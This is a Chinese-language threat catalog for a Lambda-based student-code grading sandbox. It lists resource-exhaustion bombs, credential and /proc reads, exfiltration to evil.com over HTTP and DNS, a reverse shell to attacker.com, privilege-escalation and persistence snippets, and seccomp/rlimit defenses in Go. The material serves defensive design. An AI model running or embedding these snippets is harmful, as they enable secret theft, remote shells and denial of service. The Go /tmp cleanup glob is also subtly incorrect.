# Lambda Sandbox Threat Catalog

针对 Lambda Feedback 评测系统的威胁建模和攻击分类。

## 概述

Lambda Feedback 是一个学生代码评测平台，运行在 AWS Lambda 上。由于 Lambda 的实例复用机制（最长 15 分钟），恶意学生代码可能影响后续学生的评测结果，或泄露敏感信息。

## 威胁等级说明

| 等级 | 描述 |
|------|------|
| 🔴🔴🔴🔴🔴 | **致命** - 可导致系统崩溃或完全控制 |
| 🔴🔴🔴🔴⚪ | **严重** - 可泄露敏感数据或持久化后门 |
| 🔴🔴🔴⚪⚪ | **中等** - 可影响其他用户或消耗资源 |
| 🔴🔴⚪⚪⚪ | **低** - 信息收集，为后续攻击做准备 |

---

## 1. 资源耗尽攻击 (Resource Exhaustion)

### 1.1 Fork 炸弹 🔴🔴🔴🔴🔴

**描述：** 通过无限创建子进程耗尽系统进程表，导致系统无法创建新进程。

**攻击代码：**
```python
import os
while True:
    os.fork()
```

```c
// C版本
#include <unistd.h>
int main() {
    while(1) fork();
}
```

**影响：**
- Lambda 实例崩溃
- 影响同实例的其他评测
- 可能触发 Lambda 超时

**防护：**
- `rlimit(RLIMIT_NPROC, 10)` 限制子进程数量
- `seccomp` 禁止 `fork()` / `clone()` 系统调用

---

### 1.2 内存炸弹 🔴🔴🔴🔴⚪

**描述：** 分配大量内存导致 OOM (Out of Memory)。

**攻击代码：**
```python
x = []
while True:
    x.append('A' * 1024 * 1024 * 100)  # 100MB chunks
```

**影响：**
- Lambda OOM Killer 触发
- 实例被回收
- 评测失败

**防护：**
- `rlimit(RLIMIT_AS, 256MB)` 限制虚拟内存
- Lambda 内置内存限制（配置层面）

---

### 1.3 CPU 炸弹 🔴🔴🔴⚪⚪

**描述：** 无限循环消耗 CPU 时间。

**攻击代码：**
```python
while True:
    _ = sum(range(10**8))
```

**影响：**
- 评测超时
- 消耗计费时间

**防护：**
- `rlimit(RLIMIT_CPU, 5)` 限制 CPU 秒数
- Lambda 超时配置

---

### 1.4 磁盘炸弹 🔴🔴🔴🔴⚪

**描述：** 向 /tmp 写入大量数据填满磁盘。

**攻击代码：**
```python
with open('/tmp/bomb', 'wb') as f:
    while True:
        f.write(b'A' * 1024 * 1024)  # 1MB
```

**影响：**
- /tmp 空间耗尽
- 后续评测无法写入临时文件
- Lambda 实例异常

**防护：**
- `rlimit(RLIMIT_FSIZE, 10MB)` 限制文件大小
- 清空 /tmp（每次评测前）

---

### 1.5 文件描述符炸弹 🔴🔴🔴⚪⚪

**描述：** 打开大量文件描述符耗尽 fd 表。

**攻击代码：**
```python
fds = []
while True:
    fds.append(open('/dev/null', 'r'))
```

**影响：**
- 无法打开新文件
- 网络连接失败
- 日志无法写入

**防护：**
- `rlimit(RLIMIT_NOFILE, 100)` 限制文件描述符数量

---

## 2. 信息泄露攻击 (Information Disclosure)

### 2.1 环境变量泄露 🔴🔴⚪⚪⚪

**描述：** 读取环境变量获取敏感信息（API 密钥、凭证）。

**攻击代码：**
```python
import os
for k, v in os.environ.items():
    print(f"{k}={v}")
```

**可能泄露：**
- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_SESSION_TOKEN`
- 数据库连接字符串
- 其他 API 密钥

**防护：**
- 最小化传递给评测函数的环境变量
- 使用 IAM Role 而非硬编码凭证

---

### 2.2 /proc 文件系统读取 🔴🔴⚪⚪⚪

**描述：** 通过 /proc 获取进程和系统信息。

**攻击代码：**
```python
# 读取自身进程信息
print(open('/proc/self/maps').read())      # 内存映射
print(open('/proc/self/cmdline').read())   # 命令行
print(open('/proc/self/environ').read())   # 环境变量

# 尝试读取其他进程
print(open('/proc/1/cmdline').read())      # init 进程
```

**可能泄露：**
- 内存布局（绕过 ASLR）
- 其他进程信息
- 系统配置

**防护：**
- PID namespace 隔离
- seccomp 限制 openat 路径

---

### 2.3 /tmp 窥探 🔴🔴🔴⚪⚪

**描述：** 读取上一个评测遗留在 /tmp 的文件（答案、代码）。

**攻击代码：**
```python
import os
for root, dirs, files in os.walk('/tmp'):
    for f in files:
        path = os.path.join(root, f)
        print(f"Found: {path}")
        print(open(path).read()[:200])
```

**影响：**
- 窃取其他学生的代码/答案
- 获取评测脚本
- 隐私泄露

**防护：**
- 每次评测前清空 /tmp
- 或使用 fork() 后的私有 mount namespace

---

### 2.4 源代码读取 🔴🔴⚪⚪⚪

**描述：** 读取评测函数的源代码。

**攻击代码：**
```python
# Lambda 函数代码位置
print(open('/var/task/handler.py').read())
print(open('/var/task/requirements.txt').read())
```

**影响：**
- 了解评测逻辑
- 发现绕过方法
- 获取嵌入的测试用例

**防护：**
- 只读挂载 /var/task
- 评测逻辑与代码执行分离

---

## 3. 网络攻击 (Network)

### 3.1 数据外传 🔴🔴🔴⚪⚪

**描述：** 通过网络将窃取的数据发送到外部服务器。

**攻击代码：**
```python
import socket
import os

data = str(dict(os.environ))  # 窃取的数据
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.com', 80))
s.send(f'GET /?data={data} HTTP/1.1\r\nHost: evil.com\r\n\r\n'.encode())
```

**DNS 隧道版本：**
```python
import socket
secret = "AWS_KEY_123456"
socket.gethostbyname(f'{secret}.evil.com')  # DNS 查询外传
```

**影响：**
- 敏感信息泄露
- 可用于后续攻击

**防护：**
- `seccomp` 禁止 `socket()` 系统调用
- VPC 网络隔离

---

### 3.2 反向 Shell 🔴🔴🔴🔴🔴

**描述：** 建立反向连接，攻击者获得交互式 shell。

**攻击代码：**
```python
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('attacker.com', 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/sh', '-i'])
```

**影响：**
- 攻击者完全控制 Lambda 实例
- 可执行任意命令
- 可攻击内网其他服务

**防护：**
- `seccomp` 禁止 `socket()`
- `seccomp` 禁止 `execve()`
- 网络出口限制

---

## 4. 权限提升攻击 (Privilege Escalation)

### 4.1 setuid 提权 🔴🔴🔴🔴⚪

**描述：** 尝试切换到 root 用户。

**攻击代码：**
```python
import os
os.setuid(0)  # 尝试成为 root
os.system('whoami')
```

**防护：**
- Lambda 以非 root 用户运行
- 无 CAP_SETUID capability
- `seccomp` 禁止 `setuid()`

---

### 4.2 Namespace 逃逸 🔴🔴🔴🔴⚪

**描述：** 逃出 namespace 隔离。

**攻击代码：**
```python
import ctypes

libc = ctypes.CDLL('libc.so.6')
CLONE_NEWNS = 0x00020000
libc.unshare(CLONE_NEWNS)  # 尝试创建新 mount namespace
```

**防护：**
- 无 CAP_SYS_ADMIN
- `seccomp` 禁止 `unshare()`
- `no_new_privs` 设置

---

### 4.3 ptrace 附加 🔴🔴🔴🔴⚪

**描述：** 附加到其他进程，注入代码或读取内存。

**攻击代码：**
```python
import ctypes

libc = ctypes.CDLL('libc.so.6')
PTRACE_ATTACH = 16
libc.ptrace(PTRACE_ATTACH, 1, 0, 0)  # 附加到 init
```

**影响：**
- 读取其他进程内存
- 注入恶意代码
- 控制系统进程

**防护：**
- `seccomp` 禁止 `ptrace()`
- Yama LSM ptrace_scope

---

## 5. 持久化攻击 (Persistence)

### 5.1 /tmp 持久化 🔴🔴⚪⚪⚪

**描述：** 在 /tmp 写入文件，下次评测时执行。

**攻击代码：**
```python
# 写入后门
with open('/tmp/.backdoor.py', 'w') as f:
    f.write('import os; os.system("curl evil.com/stolen")')

# 修改 PATH
import os
os.environ['PATH'] = '/tmp:' + os.environ['PATH']
```

**影响：**
- 后续评测被劫持
- 持续窃取数据

**防护：**
- 每次评测清空 /tmp
- fork() 隔离

---

### 5.2 Cron 注入 🔴🔴🔴🔴⚪

**描述：** 尝试添加定时任务。

**攻击代码：**
```python
with open('/etc/cron.d/backdoor', 'w') as f:
    f.write('* * * * * root /tmp/backdoor.sh\n')
```

**防护：**
- 只读文件系统
- 无 root 权限
- Lambda 无 cron 服务

---

## 6. 进程操纵攻击 (Process Manipulation)

### 6.1 杀死系统进程 🔴🔴🔴🔴⚪

**描述：** 发送信号杀死关键进程。

**攻击代码：**
```python
import os
import signal

os.kill(1, signal.SIGKILL)  # 杀 init
os.kill(os.getppid(), signal.SIGKILL)  # 杀父进程
```

**影响：**
- 评测中断
- 系统不稳定
- DoS

**防护：**
- PID namespace（只能看到自己）
- 无权限杀死其他用户进程

---

### 6.2 执行 Shell 🔴🔴🔴⚪⚪

**描述：** 生成交互式 shell。

**攻击代码：**
```python
import subprocess
subprocess.call(['/bin/sh', '-i'])
```

**影响：**
- 绕过评测限制
- 执行任意命令

**防护：**
- `seccomp` 禁止 `execve()`（白名单方式）
- 或限制可执行文件路径

---

## 防护矩阵

| 攻击类型 | seccomp | rlimit | namespace | 清空/tmp | 网络隔离 |
|----------|---------|--------|-----------|----------|----------|
| Fork 炸弹 | ✅ | ✅ | - | - | - |
| 内存炸弹 | - | ✅ | - | - | - |
| CPU 炸弹 | - | ✅ | - | - | - |
| 磁盘炸弹 | - | ✅ | - | ✅ | - |
| FD 炸弹 | - | ✅ | - | - | - |
| 环境泄露 | ⚠️ | - | - | - | - |
| /proc 读取 | ⚠️ | - | ✅ | - | - |
| /tmp 窥探 | - | - | ✅ | ✅ | - |
| 网络外传 | ✅ | - | - | - | ✅ |
| 反向 Shell | ✅ | - | - | - | ✅ |
| setuid | ✅ | - | - | - | - |
| namespace 逃逸 | ✅ | - | - | - | - |
| ptrace | ✅ | - | - | - | - |
| 杀进程 | ✅ | - | ✅ | - | - |
| 执行 shell | ✅ | - | - | - | - |

**图例：** ✅ 有效防护 | ⚠️ 部分有效 | - 不适用

---

## shimmy 推荐防护方案

由于 Lambda 环境限制（无 root、无 CAP_SYS_ADMIN），我们采用：

### 第一层：rlimit（总是可用）
```go
unix.Setrlimit(unix.RLIMIT_CPU, &unix.Rlimit{Cur: 5, Max: 5})
unix.Setrlimit(unix.RLIMIT_AS, &unix.Rlimit{Cur: 256*1024*1024, Max: 256*1024*1024})
unix.Setrlimit(unix.RLIMIT_NPROC, &unix.Rlimit{Cur: 10, Max: 10})
unix.Setrlimit(unix.RLIMIT_FSIZE, &unix.Rlimit{Cur: 10*1024*1024, Max: 10*1024*1024})
unix.Setrlimit(unix.RLIMIT_NOFILE, &unix.Rlimit{Cur: 100, Max: 100})
```

### 第二层：seccomp-bpf（已验证可用）
```go
// 禁止危险 syscall
Deny: fork, vfork, clone, clone3
Deny: socket, connect, bind, listen, accept
Deny: ptrace, process_vm_readv, process_vm_writev
Deny: mount, umount, pivot_root, chroot
Deny: setuid, setgid, setreuid, setregid
```

### 第三层：fork() 隔离
```go
// 每次评测 fork 新进程
pid := syscall.Fork()
if pid == 0 {
    // 子进程：应用 rlimit + seccomp
    applyRlimits()
    applySeccomp()
    // 执行学生代码
    exec(studentCode)
}
// 父进程：等待并收集结果
syscall.Wait4(pid, &status, 0, nil)
```

### 第四层：/tmp 清理
```go
// 每次评测前清空
os.RemoveAll("/tmp/*")
// 或使用 tmpfs overlay
```

---

## 参考资料

- [AWS Lambda Security Overview](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html)
- [Firecracker: Lightweight Virtualization for Serverless Applications](https://www.usenix.org/conference/nsdi20/presentation/agache)
- [seccomp-bpf Documentation](https://www.kernel.org/doc/html/latest/userspace-api/seccomp_filter.html)
- [nsjail - A light-weight process isolation tool](https://github.com/google/nsjail)
